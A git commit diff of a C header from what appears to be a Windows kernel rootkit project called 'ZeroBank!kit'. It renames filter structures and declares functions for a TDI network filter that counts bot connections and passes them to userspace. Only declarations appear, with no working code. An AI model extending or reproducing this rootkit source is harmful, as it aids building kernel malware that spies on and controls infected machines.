0387a55a45b26936d79065201e4e1fb731e43a5e
Alexander <alexstrife77@gmail.com>
2018-08-29 20:06:31 +0200

    Update filter.h

--- ZeroBank!kit/filter.h
+++ ZeroBank!kit/filter.h
@@ -7,11 +7,11 @@ typedef struct _ROOTKIT_NETWORK_ADDRESS
 
 }ROOTKIT_NETWORK_ADDRESS, *PROOTKIT_NETWORK_ADDRESS;
 
-typedef struct _ZEROBANK_FILTER_DATA
+typedef struct _ZEROBANK_FILTER_CONNECTION_REQUESTS
 {
 	LIST_ENTRY Entry;
-	ULONG Type;
-}ZEROBANK_FILTER_DATA, *PZEROBANK_FILTER_DATA;
+	CHAR ShareData[255];
+}ZEROBANK_FILTER_CONNECTION_REQUESTS, *PZEROBANK_FILTER_CONNECTION_REQUESTS;
 
 typedef struct _ZEROBANK_FILTER_HEAD
 {
@@ -20,9 +20,11 @@ typedef struct _ZEROBANK_FILTER_HEAD
 }ZEROBANK_FILTER_HEAD, *PZEROBANK_FILTER_HEAD;
 
 
-PZEROBANK_FILTER_HEAD rk_get_number_of_bot_connections(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
-ULONG rk_copy_connections_to_buffer(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp, IN PZEROBANK_FILTER_DATA pData);
+extern PZEROBANK_FILTER_HEAD g_filter_head;
+PZEROBANK_FILTER_HEAD rk_get_number_of_bot_connections(IN PIO_STACK_LOCATION pStackLocation);
+ULONG g_rk_copy_connections_to_buffer(IN PZEROBANK_FILTER_CONNECTION_REQUESTS pConnectionsRequest);
 
-NTSTATUS g_rk_connect_filter(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
-NTSTATUS g_rk_connect_filter_thread(IN PVOID Context);
-NTSTATUS g_rk_start_TDI_filter(IN PZEROBANK_TDI_FILTER tdi);
+
+NTSTATUS g_rk_connect_start_filter(IN PZEROBANK_TDI_FILTER tdi);
+BOOLEAN g_rk_send_connections_to_userspace(IN PFILE_OBJECT pSocket, IN PROOTKIT_API_HASH Hash);
+NTSTATUS g_rk_connect_dispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
